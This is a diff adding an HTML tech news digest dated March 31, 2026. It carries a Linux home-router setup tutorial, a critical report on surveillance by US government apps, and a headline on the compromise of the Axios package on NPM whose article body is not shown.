@@ -1,0 +1,609 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Tech Digest: March 31, 2026</title>
+    <link rel="stylesheet" href="../style.css">
+</head>
+<body>
+    <header>
+        <h1>Tech Digest</h1>
+        <p class="date">Tuesday, March 31, 2026</p>
+        <p class="count">10 Articles</p>
+        <nav>
+            <a href="../">Home</a>
+            <a href="../archive/">Archive</a>
+        </nav>
+    </header>
+    
+    <main>
+        
+        <section class="toc">
+            <h2>Contents</h2>
+            <ol>
+                
+            <li>
+                <a href="#article-1">How to turn anything into a router</a>
+                <span class="toc-meta">hackernews - 648 pts</span>
+            </li>
+            
+            <li>
+                <a href="#article-2">Fedware: Government apps that spy harder than the apps they ban</a>
+                <span class="toc-meta">hackernews - 516 pts</span>
+            </li>
+            
+            <li>
+                <a href="#article-3">Axios compromised on NPM – Malicious versions drop remote access trojan</a>
+                <span class="toc-meta">hackernews - 405 pts</span>
+            </li>
+            
+            <li>
+                <a href="#article-4">Do your own writing</a>
+                <span class="toc-meta">hackernews - 463 pts</span>
+            </li>
+            
+            <li>
+                <a href="#article-5">Paris-based AI startup Mistral raised $830M in its debut debt financing to build Nvidia-powered d...</a>
+                <span class="toc-meta">techmeme - 100 pts</span>
+            </li>
+            
+            <li>
+                <a href="#article-6">CodingFont: A game to help you pick a coding font</a>
+                <span class="toc-meta">hackernews - 376 pts</span>
+            </li>
+            
+            <li>
+                <a href="#article-7">CEO @arthurmensch says: “Scaling our infrastructure in Europe is critical to empower our customer...</a>
+                <span class="toc-meta">techmeme - 97 pts</span>
+            </li>
+            
+            <li>
+                <a href="#article-8">• First site near Paris to launch by June.  13,800 top-end Nvidia GB300 chips  • Mistral&#39;s full-s...</a>
+                <span class="toc-meta">techmeme - 94 pts</span>
+            </li>
+            
+            <li>
+                <a href="#article-9">It also 20x&#39;ed revenue in the last year and is on track to surpass $1bn by the of the 2026</a>
+                <span class="toc-meta">techmeme - 91 pts</span>
+            </li>
+            
+            <li>
+                <a href="#article-10">Microsoft rolls out Copilot Cowork to its Frontier program for early-stage testing, including a n...</a>
+                <span class="toc-meta">techmeme - 88 pts</span>
+            </li>
+            
+            </ol>
+        </section>
+        
+        
+        <section class="ai-summary">
+            <h2>Today's Highlights</h2>
+            <p><strong>Top Stories</strong>  <br/>Mistral, a Paris-based AI startup, has successfully raised $830 million in its debut debt financing, aiming to establish Nvidia-powered data centers across Europe. This funding marks a significant step towards Mistral’s ambitious plan to invest €4 billion in infrastructure, which highlights the growing demand for AI capabilities on the continent. As AI innovation increasingly becomes a competitive edge, Mistral’s move reinforces the critical role of robust infrastructure in supporting Europe’s tech landscape and ensuring its autonomy in AI development.</p><p><strong>Key Developments</strong>  <br/>In cybersecurity, a recent breach involving malicious versions of the Axios package on NPM has raised alarms. The introduction of a remote access trojan underscores the vulnerabilities in open-source ecosystems, reminding developers to exercise caution when integrating third-party packages. This incident emphasizes the ongoing risk of supply chain attacks in software development and the importance of maintaining rigorous security practices.</p><p>On the government front, a report has surfaced detailing how certain government apps may be more invasive than the very applications they aim to regulate. This raises ethical concerns about privacy and surveillance, particularly as public trust in technology continues to wane. The implications of these findings could lead to increased scrutiny of governmental digital practices and a push for more transparency.</p><p>In the realm of AI and writing, an article advocates for individuals to produce their own content rather than relying on AI-generated text. As AI tools become more prevalent in content creation, the piece encourages authenticity and the unique human touch in writing, which could resonate with professionals aiming to maintain originality in a crowded digital landscape.</p><p>Microsoft is enhancing its AI capabilities with the rollout of Copilot Cowork, an extension of its Frontier program. This initiative includes new tools that leverage advanced models from Anthropic and OpenAI, reflecting Microsoft's commitment to integrating AI into workplace productivity. Such developments may significantly influence how teams collaborate and utilize AI tools for research and task management.</p><p><strong>Quick Hits</strong>  </p><p>• A new game, CodingFont, helps developers choose their ideal coding font, blending utility with engagement.  </p><p>• The hacker community is buzzing over a method to turn almost anything into a router, showcasing ingenuity in connectivity solutions.  </p><p>• The rapid revenue growth of certain tech companies, including predictions for surpassing $1 billion by 2026, indicates a robust marketplace for innovative tech solutions.  </p><p>• An upcoming site near Paris will feature 13,800 top-end Nvidia chips, emphasizing the strategic importance of advanced computing resources for AI applications.</p>
+            <div class="ai-disclaimer">
+                This summary was generated by AI (GPT-4o-mini)
+            </div>
+        </section>
+        
+        
+        <article id="article-1">
+            <h2>How to turn anything into a router</h2>
+            <div class="article-meta"><span class="source-badge">hackernews</span> • <span class="article-score">648 points</span> • by yabones • March 30, 2026</div>
+            <div class="article-content">
+                <html>
+  <body><h1>How to turn anything into a router</h1><p>I don’t like to cover “current events” very much, but the American government just revealed a <a href="https://arstechnica.com/tech-policy/2026/03/trump-fcc-prohibits-import-and-sale-of-new-wi-fi-routers-made-outside-us/">truly bewildering</a> policy effectively banning import of new consumer router models.
+This is ridiculous for many reasons, but if this does indeed come to pass it may be beneficial to learn how to “homebrew” a router.</p><p>Fortunately, you can make a router out of basically anything resembling a computer.</p><p>I’ve used a linux powered mini-pc as my own router for many years, and have posted a few times before about how to make linux <a href="https://nbailey.ca/post/2019-linux-router">routers</a> and <a href="https://nbailey.ca/post/linux-firewall-ids">firewalls</a> in that time. It’s been rock solid stable, and the only issue I’ve had over the years was wearing out a $20 mSATA drive.
+While I use <a href="https://debian.org">Debian</a> typically, <a href="https://www.alpinelinux.org/">Alpine</a> linux probably works just as well, perhaps better if you’re familiar with it.
+As long as the device runs Linux well and has a couple USB ports, you’re good to go.
+Mini-PCs, desktop PCs, SBCs, rackmount servers, old laptops, or purpose built devices will all work.</p><p>To be clear, this is not meant to be a practical “solution” to the US policy, it’s to show people a neat “hack” you can do to squeeze more capability out of hardware you might already own, and to demonstrate that there’s nothing <i>special</i> about routers - They’re all just computers after all.</p><h3>Hardware selection</h3><p>My personal preference is a purpose-made mini PC with a passively cooled design.</p><p><graphic src="https://nbailey.ca/images/router.jpg" alt="proper router"/></p><p>However, basically anything will work. It should have two Ethernet interfaces, but a standard USB-Ethernet dongle will also do the trick. It won’t be as reliable as an onboard interface, but will probably be good enough. For example, this janky pile of spare parts can easily push 820-850mbps on the wired LAN and ~300 mbps on the wireless network:</p><p><graphic src="https://nbailey.ca/images/crappy-router.jpg" alt="crappy router"/></p><p>This particular device is a Celeron 3205U dual core running at a blistering 1.5 GHz. Even that measly chip is more than capable of routing an entire house or small business worth of traffic.</p><p>Going back even further, this was my setup for the first couple weeks of the fall 2016 semester:</p><p><graphic src="https://nbailey.ca/images/trash-router.jpg" alt="trash router"/></p><p>It might be hard to tell what’s going on here by looking, so let me break it down:</p><ul><li>A ThinkPad T60, trash picked from my previous job</li><li>An ExpressCard-PCIe bridge in the ThinkPad’s expansion bay</li><li>A trash-picked no-name Ethernet card in the PCIe slot, missing its mounting bracket</li><li>An ancient Cisco 2960 100 mbit switch, purchased for $10 from my college</li><li>A D-Link router acting as an access point (“as-is” thrift store find with a bad WAN port)</li></ul><p>Yes, this is indeed a router! It probably looks like a pile of junk, because it is, but it’s junk that’s perfectly able to perform the job I gave it!</p><h3>How does it get configured?</h3><p>When set up, the system will be configured like this:</p><table><row span="2"><cell role="head">Interface</cell><cell role="head">Network</cell></row><row span="2"><cell>eth0</cell><cell>WAN</cell></row><row span="2"><cell>eth1</cell><cell>LAN (Wired)</cell></row><row><cell>wlan0</cell><cell>LAN (Wireless)</cell></row></table><p>Both LAN interfaces will be <a href="https://wiki.debian.org/BridgeNetworkConnections">bridged together</a>, meaning that devices on the wired and wireless networks will be able to communicate normally. If one LAN port isn’t enough, you can plug in as many USB Ethernet dongles as you need and bridge ’em all together. It won’t be quite as fast as a “real” switch, but if you’re looking for performance you might’ve come to the wrong place today.</p><p>As mentioned before, this will run Debian as the operating system, and uses very few pieces that don’t come with the base install:</p><ul><li>Any firmware blobs not in the default install</li><li><pre>hostapd</pre>- For creating the Wi-Fi network</li><li><pre>dnsmasq</pre>- For DNS &amp; DHCP</li><li><pre>bridge-utils</pre>- For combinding ports into a common network</li></ul><p>Also, I should mention that I’ll only be setting up IPv4 here. IPv6 works great for stuff like mobile devices, but I still find it too frustrating inside a LAN. Perhaps my brain is too calcified already, but I’ll happily hold out on IPv4 for now.</p><h3>Install &amp; Setup</h3><p>Overall, it’s a pretty standard Debian install. A couple things I should mention:</p><ul><li>Disable PXE network boot in the BIOS/UEFI setup.</li><li>If you can, set the device to the lowest clock speed, but disable any power management for USB or PCI devices.</li><li>Find the option like “Restore after AC Power Loss” and turn it ON.</li><li>Some devices won’t properly power up if there’s no display connected. If your device is like this, stick a “dummy dongle” into the HDMI port.</li><li>Lots of hardware will only work correctly with the <pre>non-free-firmware</pre>repository enabled</li></ul><p>Depending on your wireless hardware, you may need to install an additional firmware package.</p><p>For Intel devices:</p><pre><pre>sudo apt install firmware-iwlwifi
+</pre></pre>
+<p>For Realtek devices:</p><pre><pre>sudo apt install firmware-ath9k-htc
+</pre></pre>
+<p>Or if you have something truly ancient like I do:</p><pre><pre>sudo apt install firmware-atheros
+</pre></pre>
+<h3>Install the required packages</h3><p>After the initial install is done, there are some additional utilities to install:</p><pre><pre>sudo apt install bridge-utils hostapd dnsmasq
+</pre></pre>
+<p>In terms of software, that’s about all that’s needed. There should be about 250 packages on the system in total.</p><h3>Name the interfaces properly</h3><p>In modern Linux systems, the network interface names are named based on physical connection and driver type, like <pre>enp0s31f6</pre>. I find the old format, like <pre>ethX</pre> much simpler, so each interface gets a persistent name.</p><p>For each network interface, create a file at <pre>/etc/systemd/network/10-persistent-ethX.link</pre></p><pre><pre>[Match]
+MACAddress=AA:BB:CC:DD:00:11
+
+[Link]
+Name=ethX
+</pre></pre><h3>Create the wireless network</h3><p>This uses a USB Wi-Fi dongle to act as an <a href="https://www.cyberciti.biz/faq/debian-ubuntu-linux-setting-wireless-access-point/">access point</a>, creating a network for other devices to join. This will <i>not</i> work as well as a purpose built device, but it’s better than nothing. I’ve had reasonably good results with this, but I also live in a very small building where I’m rarely more than 10m away from the router.
+If you rely heavily on your wireless network working properly, try to find a dedicated access point device. An old router, even from over a decade ago, will probably work fine for this by just connecting to its LAN port (not the WAN port!).</p><p>To set up the onboard wi-fi network, create a config file at <pre>/etc/hostapd/hostapd.conf</pre></p><pre><pre>interface=wlan0
+bridge=br0
+hw_mode=g
+channel=11
+ieee80211d=1
+country_code=US
+ieee80211n=1
+wmm_enabled=1
+
+ssid=My Cool and Creative Wi-Fi Name
+auth_algs=1
+wpa=2
+wpa_key_mgmt=WPA-PSK
+rsn_pairwise=CCMP
+wpa_passphrase=mysecurepassword
+</pre></pre><p>By default the <pre>hostapd</pre> service is not startable, so we unmask it before enabling the service.</p><pre><pre>sudo systemctl unmask hostapd
+sudo systemctl enable --now hostapd
+</pre></pre>
+<h3>Configure the interfaces</h3><p>The “outside” interface will be the WAN, and the “inside” will be the LAN. Note that the LAN interface does not get a default gateway.</p><p><pre>/etc/network/interfaces</pre></p><pre><pre>allow-hotplug eth0
+allow-hotplug eth1
+auto wlan0
+auto br0
+
+iface eth0 inet dhcp
+
+iface br0 inet static
+    bridge_ports eth1 wlan0
+    address 192.168.1.1/24
+</pre></pre><p>After this step, the device should have a quick reboot. It <i>should</i> come back up nicely. If it doesn’t confirm that the previous steps were done correctly, and check for errors by running <pre>journalctl -e -u networking.service</pre></p><p>If it all worked correctly, the output of this command should be the same:</p><pre><pre>$ sudo brctl show br0
+
+bridge name     bridge id            STP enabled    interfaces
+br0             8000.xxxxx           no             eth1
+                                                    wlan0
+</pre></pre><h3>IP Forwarding</h3><p>Create <pre>/etc/sysctl.d/10-forward.conf</pre> and add this line to enable IP forwarding:</p><pre><pre>net.ipv4.ip_forward=1
+</pre></pre><p>Apply the changes:</p><pre><pre>sudo systemctl restart systemd-sysctl.service
+</pre></pre>
+<h3>Firewall rules</h3><p>The firewall rules and NAT configuration are both handled by the <a href="https://wiki.nftables.org/wiki-nftables/index.php/Moving_from_iptables_to_nftables">new  netfilter system</a> in Linux. We manage this using </p><pre>nftables</pre>.<p><pre>/etc/nftables.conf</pre></p><pre><pre>#!/usr/sbin/nft -f
+
+flush ruleset
+
+table inet filter {
+    chain input {
+        type filter hook input priority 0; policy drop;
+        ct state { established,related } counter accept
+        ip protocol icmp counter accept
+        iifname "br0" tcp dport { 22, 53 } counter accept
+        iifname "br0" udp dport { 53, 67, 68 } counter accept
+        counter
+    }
+
+    chain forward {
+        type filter hook forward priority 0; policy drop;
+        iifname "eth0" oifname "br0" ct state { established,related } counter accept 
+        iifname "br0" oifname "eth0" ct state { new,established,related } counter accept
+        counter
+    }
+
+    chain output {
+        type filter hook output priority 0; policy accept;
+        counter
+    }
+}
+
+table ip nat {
+    chain postrouting {
+        type nat hook postrouting priority 100; policy accept;
+        oifname "eth0" counter masquerade
+    }
+}
+</pre></pre><p>This performs NAT, denies all inbound traffic from outside the network, and allows the router device to act as a DNS, DHCP, and SSH server (for management). Pretty much a bog standard firewall config.</p><p>Enable this for the next boot:</p><pre><pre>sudo systemctl enable nftables.service
+</pre></pre>
+<h3>DHCP and DNS</h3><p>Unlike my previous devices, <a href="https://blog.admin-intelligence.de/en/dnsmasq-as-dns-and-dhcp-server/">this will use  dnsmasq</a> instead of </p><pre>isc-dhcp-server</pre> and <pre>bind9</pre>. It’s smaller, easier to configure, and works just as well for the purposes of a small device like this. The configuration file is ridiculously simple, and you can’t argue with that!<p><pre>/etc/dnsmasq.conf</pre></p><pre><pre>interface=br0
+listen-address=0.0.0.0
+dhcp-range=192.168.1.50,192.168.1.250,255.255.255.0,6h
+dhcp-option=option:router,192.168.1.1
+dhcp-option=option:dns-server,192.168.1.1
+cache-size=10000
+</pre></pre><p>The service can be enabled for next boot.</p><pre><pre>sudo systemctl enable dnsmasq
+</pre></pre>
+<h3>Bonus: Serial port</h3><p>If your device has an onboard serial or console port, it’s a super handy way to manage the router without having to find a monitor and keyboard to plug into it. This is extremely common in the enterprise network space, but there’s no reason a home device shouldn’t have the same capability!</p><p>Modify <pre>/etc/default/grub</pre></p><pre><pre>GRUB_CMDLINE_LINUX='console=tty0 console=ttyS0,115200n8'
+GRUB_TERMINAL=serial
+GRUB_SERIAL_COMMAND="serial --speed=115200 --unit=0 --word=8 --parity=no --stop=1"
+</pre></pre><p>Then enable the Getty service to run on the port:</p><pre><pre>sudo systemctl enable <a href="https://nbailey.ca/cdn-cgi/l/email-protection">[email protected]</a>
+</pre></pre>
+<p>Update the grub bootloader config, and restart the box.</p><pre><pre>sudo update-grub
+</pre></pre>
+<h3>Check how it’s working</h3><p>After it’s all configured, give the device a couple restarts to make sure everything will come up reliably.</p><p>The status of the firewall can be checked to make sure traffic is moving through the network:</p><pre><pre>$ sudo nft list ruleset
+
+table inet filter {
+	chain input {
+		type filter hook input priority filter; policy drop;
+		ct state { established, related } counter packets 1546 bytes 138508 accept
+		ip protocol icmp counter packets 1 bytes 84 accept
+		iifname "br0" tcp dport { 22, 53 } counter packets 4 bytes 240 accept
+		iifname "br0" udp dport { 53, 67, 68 } counter packets 92 bytes 6658 accept
+		counter packets 2110 bytes 128536
+	}
+
+	chain forward {
+		type filter hook forward priority filter; policy drop;
+		iifname "eth0" oifname "br0" ct state { established, related } counter packets 52964 bytes 479878687 accept
+		iifname "br0" oifname "eth0" ct state { established, related, new } counter packets 78017 bytes 54802223 accept
+		counter packets 0 bytes 0
+	}
+
+	chain output {
+		type filter hook output priority filter; policy accept;
+		counter packets 1650 bytes 155966
+	}
+}
+table ip nat {
+	chain postrouting {
+		type nat hook postrouting priority srcnat; policy accept;
+		oifname "eth0" counter packets 101 bytes 15882 masquerade
+	}
+}
+</pre></pre><p>Before making any changes to the firewall config, be sure to validate the config file:</p><pre><pre>sudo nft -c -f /etc/nftables.conf
+</pre></pre>
+<p>A nice advantage of nftables over the older iptables is the ability to reload the service to update the ruleset without disruption:</p><pre><pre>sudo systemctl reload nftables.service
+</pre></pre>
+<p>The DHCP server can be checked by looking at its log, and checking the lease file:</p><pre><pre>sudo less /var/lib/misc/dnsmasq.leases
+sudo journalctl -eu dnsmasq.service
+</pre></pre>
+<h3>More things it can do</h3><p>At this point, the device should work pretty much perfectly. If desired, there are a few more features that can be configured or added with additional packages:</p><ul><li>Logging specific rule hits, or creating flow logs</li><li>VLANs and segmentation</li><li>Reporting and <a href="https://nbailey.ca/post/simple-alerts">alerts</a></li><li>IPv6</li><li>Real-time <a href="https://docbot.onetwoseven.one/services/prometheus/">monitoring</a></li><li>Port forwarding outside traffic to a device in a DMZ network</li><li>VPN remote access and site-to-site tunnels</li><li>Dynamic <a href="https://frrouting.org/">routing</a>protocols, IGPs, BGP, etc.</li><li><a href="https://nbailey.ca/post/block-scanners">Network filtering</a>and blocking</li><li><a href="https://nbailey.ca/post/malware-on-the-wire">Intrusion detection</a>and prevention</li></ul><p>The beauty of something like this is the simplicity and reliability. While it may seem appealing, I would highly recommend <i>against</i> installing loads of software right on the router, and instead forward traffic to a device in a DMZ or VLAN.</p><p>We have the power to make anything into a router. Try it! Find a pile of e-waste, look for some pieces that work, and build a new router based on free software!</p></body>
+</html>
+            </div>
+            
+            <div class="article-link">
+                <strong>Original:</strong> <a href="https://nbailey.ca/post/router/">https://nbailey.ca/post/router/</a>
+            </div>
+            
+        </article>
+        
+        <article id="article-2">
+            <h2>Fedware: Government apps that spy harder than the apps they ban</h2>
+            <div class="article-meta"><span class="source-badge">hackernews</span> • <span class="article-score">516 points</span> • by speckx • March 30, 2026</div>
+            <div class="article-content">
+                <html>
+  <body>
+    <p>
+      <a href="https://www.sambent.com/404/">surveillance</a>
+    </p>
+    <h1>Fedware: 13 Government Apps That Spy Harder Than the Apps They Ban</h1>
+    <p>The White House app ships with a sanctioned Chinese tracking SDK, the FBI app serves ads, and FEMA wants 28 permissions to show you weather alerts.</p>
+    <graphic src="/content/images/size/w1200/2026/03/feature-final-v2.jpg" alt="Fedware: 13 Government Apps That Spy Harder Than the Apps They Ban"/>
+    <p>
+      <a href="https://reports.exodus-privacy.eu.org/en/reports/search/gov.whitehouse.app/?ref=sambent.com">
+            Version 47.0.1 requests precise GPS, fingerprint access, storage modification, auto-start at boot, draw over apps, and Wi-Fi scanning for a news app.
+          
+        </a>
+    </p>
+    <p>
+      <a href="https://reports.exodus-privacy.eu.org/en/reports/com.fbi.dashboard/latest/?ref=sambent.com">
+            The FBI's official app has 12 permissions, 4 trackers including Google AdMob. It serves targeted ads while reading your phone identity.
+          
+        </a>
+    </p>
+    <p>
+      <a href="https://reports.exodus-privacy.eu.org/en/reports/gov.dhs.cbp.pspd.mpc/latest/?ref=sambent.com">
+            Background location tracking, camera, biometrics, full storage access. Faceprints retained for up to 75 years across DHS, ICE, and FBI.
+          
+        </a>
+    </p>
+    <p>
+      <a href="https://www.aclu.org/news/privacy-technology/new-records-detail-dhs-purchase-and-use-of-vast-quantities-of-cell-phone-location-data?ref=sambent.com">
+            DHS, FBI, DOD, and DEA buy location data from 250M+ devices without warrants, bypassing the Supreme Court's Carpenter ruling entirely.
+          
+        </a>
+    </p>
+    <p>
+      <a href="https://www.gao.gov/products/gao-23-106443?ref=sambent.com">
+            Nearly 60% of 236 GAO privacy and security recommendations from 2010 onward remain unimplemented. Congress was told twice to pass privacy law. It has done neither.
+          
+        </a>
+    </p>
+    <p>The federal government released an app yesterday, March 27th, and it's spyware.</p>
+    <p>The <a href="https://play.google.com/store/apps/details?id=gov.whitehouse.app&amp;ref=sambent.com">White House app</a> markets itself as a way to get "unparalleled access" to the Trump administration, with press releases, livestreams, and policy updates. The kind of content that every RSS feed on the planet delivers with one permission: network access. But the White House app, version 47.0.1 (because subtlety died a long time ago), requests <a href="https://www.ibtimes.com/white-house-app-settings-grant-full-control-over-your-device-users-warned-extreme-risks-3800465?ref=sambent.com">precise GPS location, biometric fingerprint access, storage modification, the ability to run at startup, draw over other apps, view your Wi-Fi connections, and read badge notifications</a>. It also ships with <a href="https://reports.exodus-privacy.eu.org/en/reports/search/gov.whitehouse.app/?ref=sambent.com">3 embedded trackers</a> including Huawei Mobile Services Core (yes, the Chinese company the US government sanctioned, shipping tracking infrastructure inside the sitting president's official app), and it has an ICE tip line button that redirects straight to ICE's reporting page.</p>
+    <p>This thing also has a "Text the President" button that auto-fills your message with "Greatest President Ever!" and then collects your name and phone number. There's no specific privacy policy for the app, just a generic whitehouse.gov policy that doesn't address any of the app's tracking capabilities.</p>
+    <p>The White House app might actually be one of the milder ones. I've been going through every federal agency app I can find on Google Play, pulling their permissions from <a href="https://reports.exodus-privacy.eu.org/?ref=sambent.com">Exodus Privacy</a> (which audits Android APKs for trackers and permissions), and what I found deserves its own term. I'm calling it Fedware.</p>
+    <p>Ok so let me walk you through what the federal government is running on your phone.</p>
+    <p>The FBI's app, <a href="https://reports.exodus-privacy.eu.org/en/reports/com.fbi.dashboard/latest/?ref=sambent.com">myFBI Dashboard</a>, requests 12 permissions including storage modification, Wi-Fi scanning, account discovery (it can see what accounts are on your device), phone state reading, and auto-start at boot. It also contains <a href="https://reports.exodus-privacy.eu.org/en/reports/com.fbi.dashboard/latest/?ref=sambent.com">4 trackers, one of which is Google AdMob</a>, which means the FBI's official app ships with an ad-serving SDK while also reading your phone identity. From what I found, the FBI's news app has more trackers embedded than most weather apps.</p>
+    <p>The FEMA app requests <a href="https://reports.exodus-privacy.eu.org/en/reports/gov.fema.mobile.android/latest/?ref=sambent.com">28 permissions</a> including precise and approximate location, and has gone from 4 trackers in older versions down to 1 in v3.0.14. Twenty-eight permissions for an app whose primary function is showing you weather alerts and shelter locations. To put that in context, the AP News app delivers the same kind of disaster coverage with a fraction of the permissions.</p>
+    <p>IRS2Go has <a href="https://reports.exodus-privacy.eu.org/en/reports/search/gov.irs/?ref=sambent.com">3 trackers and 10 permissions</a> in its latest version, and according to a <a href="https://www.taxnotes.com/lr/resolve/tax-notes-today-federal/irs2go-smartphone-app-is-secure-tigta-says/w1dp?ref=sambent.com">TIGTA audit</a>, the IRS released this app to the public before the required Privacy Impact Assessment was even signed, which violated OMB Circular A-130. The app shares device IDs, app activity, and crash logs with third parties, and TIGTA found that the IRS never confirmed that filing status and refund amounts were masked and encrypted in the app interface.</p>
+    <p>MyTSA comes in lighter with <a href="https://reports.exodus-privacy.eu.org/en/reports/gov.dhs.tsa.mytsa/latest/?ref=sambent.com">9 permissions and 1 tracker</a>, but still requests precise and approximate location. The TSA's own <a href="https://www.dhs.gov/sites/default/files/publications/privacy_tsa_pia_028_a_mytsamobileapp_march2017.pdf?ref=sambent.com">Privacy Impact Assessment</a> says the app stores location locally and claims it never transmits GPS data to TSA. I'll give them credit for documenting that, because most of these apps have privacy policies that read like ransom notes.</p>
+    <p>CBP Mobile Passport Control is where things get genuinely alarming. This one requests <a href="https://reports.exodus-privacy.eu.org/en/reports/gov.dhs.cbp.pspd.mpc/latest/?ref=sambent.com">14 permissions including 7 classified as "dangerous"</a>: background location tracking (it follows you even when the app is closed), camera access, biometric authentication, and full external storage read/write. And the whole CBP ecosystem, from CBP One to CBP Home to Mobile Passport Control, feeds data into a network that retains your faceprints for <a href="https://www.americanimmigrationcouncil.org/research/cbp-one-overview?ref=sambent.com">up to 75 years</a> and shares it across DHS, ICE, and the FBI.</p>
+    <p>The government also built a facial recognition app called <a href="https://www.npr.org/2026/03/04/nx-s1-5717031/ice-dhs-immigrants-surveillance-confrontation-deportation-mobile-fortify?ref=sambent.com">Mobile Fortify</a> that ICE agents carry in the field. It draws from <a href="https://www.biometricupdate.com/202512/ices-use-of-cbp-biometric-surveillance-app-built-on-paper-thin-oversight?ref=sambent.com">hundreds of millions of images</a> across DHS, FBI, and State Department databases. ICE Homeland Security Investigations signed a <a href="https://www.eff.org/deeplinks/2025/11/rights-organizations-demand-halt-mobile-fortify-ices-handheld-face-recognition?ref=sambent.com">$9.2 million contract with Clearview AI</a> in September 2025, giving agents access to over 50 billion facial images scraped from the internet. DHS's own internal documents admit Mobile Fortify can be used to amass biographical information of <a href="https://www.biometricupdate.com/202512/ices-use-of-cbp-biometric-surveillance-app-built-on-paper-thin-oversight?ref=sambent.com">"individuals regardless of citizenship or immigration status"</a>, and CBP confirmed it will <a href="https://www.biometricupdate.com/202512/ices-use-of-cbp-biometric-surveillance-app-built-on-paper-thin-oversight?ref=sambent.com">"retain all photographs"</a> including those of U.S. citizens, for 15 years.</p>
+    <p>Photos submitted through CBP Home, biometric scans from Mobile Passport Control, and faces captured by Mobile Fortify all feed this system. And the EFF found that ICE <a href="https://www.eff.org/deeplinks/2025/11/rights-organizations-demand-halt-mobile-fortify-ices-handheld-face-recognition?ref=sambent.com">does not allow people to opt out of being scanned</a>, and agents can use a facial recognition match to determine your immigration status even when other evidence contradicts it. A U.S.-born citizen was told he could be deported based on a biometric match alone.</p>
+    <p><a href="https://themarkup.org/the-breakdown/2022/06/27/meet-smartlink-the-app-tracking-nearly-a-quarter-million-immigrants?ref=sambent.com">SmartLINK</a> is the ICE electronic monitoring app, built by BI Incorporated, a subsidiary of the GEO Group (a private prison company that profits directly from how many people ICE monitors), under a $2.2 billion contract. The app collects geolocation, facial images, voice prints, medical information including pregnancy data, and phone numbers of your contacts. ICE's contract gives them <a href="https://themarkup.org/the-breakdown/2022/06/27/meet-smartlink-the-app-tracking-nearly-a-quarter-million-immigrants?ref=sambent.com">"unlimited rights to use, dispose of, or disclose"</a> all data collected. The app's former terms of service allowed sharing "virtually any information collected through the application, even beyond the scope of the monitoring plan." SmartLINK went from 6,000 users in 2019 to over 230,000 by 2022, and in 2019, ICE used GPS data from these monitors to coordinate one of the largest immigration raids in history, arresting around 700 people across six cities in Mississippi.</p>
+    <p>And if you think your location data is safe because you use regular apps and avoid government ones, the federal government is buying that data too. Companies like <a href="https://www.aclu.org/news/privacy-technology/new-records-detail-dhs-purchase-and-use-of-vast-quantities-of-cell-phone-location-data?ref=sambent.com">Venntel collect 15 billion location points from over 250 million devices every day</a> through SDKs embedded in over 80,000 apps (weather, navigation, coupons, games). DHS, FBI, DOD, and the DEA <a href="https://www.eff.org/deeplinks/2022/06/how-federal-government-buys-our-cell-phone-location-data?ref=sambent.com">purchase this data without warrants</a>, creating a constitutional loophole around the Supreme Court's 2018 Carpenter v. United States ruling that requires a warrant for cellphone location history. The Defense Department even <a href="https://www.eff.org/issues/location-data-brokers?ref=sambent.com">purchased location data from prayer apps to monitor Muslim communities</a>. Police departments used similar data to track racial justice protesters.</p>
+    <p>And then there's the <a href="https://www.propublica.org/article/trump-irs-share-tax-records-ice-dhs-deportations?ref=sambent.com">IRS-ICE data sharing deal from April 2025</a>. The IRS and ICE signed a Memorandum of Understanding allowing ICE to receive names, addresses, and tax data for people with removal orders. ICE submitted 1.28 million names. The IRS <a href="https://www.pbs.org/newshour/politics/data-of-thousands-of-taxpayers-wrongly-shared-with-dhs-court-filing-says?ref=sambent.com">erroneously shared the data of thousands of people who should never have been included</a>. The acting IRS Commissioner, Melanie Krause, <a href="https://www.cnn.com/2025/04/08/politics/irs-dhs-sign-data-deal-undocumented-immigrants/index.html?ref=sambent.com">resigned in protest</a>. The chief privacy officer quit. One person leaving changes nothing about the institution, and the data was already out the door. A federal judge blocked further sharing in November 2025, ruling it likely violates IRS confidentiality protections, but by then the IRS was already building an automated system to give ICE bulk access to home addresses with minimal human oversight. The court order is a speed bump, and they'll find another route.</p>
+    <p>The apps, the databases, and the data broker contracts all feed the same pipeline, and no single agency controls it because they all share it.</p>
+    <p>The <a href="https://www.gao.gov/products/gao-23-106443?ref=sambent.com">GAO reported in 2023</a> that nearly 60% of 236 privacy and security recommendations issued since 2010 had still not been implemented. Congress has been told twice, in 2013 and 2019, to pass comprehensive internet privacy legislation. It has done neither. And it won't, because the surveillance apparatus serves the people who run it, and the people who run it write the laws. Oversight is theater. The GAO issues a report, Congress holds a hearing, everyone performs concern for the cameras, and then the contracts get renewed and the data keeps flowing. It's working exactly as designed.</p>
+    <p>The federal government publishes content available through standard web protocols and RSS feeds, then wraps that content in applications that demand access to your location, biometrics, storage, contacts, and device identity. They embed advertising trackers in FBI apps. They sell the line that you need their app to receive their propaganda while the app quietly collects data that flows into the same surveillance pipeline feeding ICE raids and warrantless location tracking. Every single one of these apps could be replaced by a web page, and they know that. The app exists because a web page can't read your fingerprint, track your GPS in the background, or inventory the other accounts on your device.</p>
+    <p>You don't need their app. You don't need their permission to access public information. You already have a browser, an RSS reader, and the ability to decide for yourself what runs on your own hardware. Use them.</p>
+  </body>
+</html>
+            </div>
+            
+            <div class="article-link">
+                <strong>Original:</strong> <a href="https://www.sambent.com/the-white-house-app-has-huawei-spyware-and-an-ice-tip-line/">https://www.sambent.com/the-white-house-app-has-huawei-spyware-and-an-ice-tip-line/</a>
+            </div>
+            
+        </article>
+        
+        <article id="article-3">
+            <h2>Axios compromised on NPM – Malicious versions drop remote access trojan</h2>
+            <div class="article-meta"><span class="source-badge">hackernews</span> • <span class="article-score">405 points</span> • by mtud • March 31, 2026</div>
+            <div class="article-content">
+                <html>
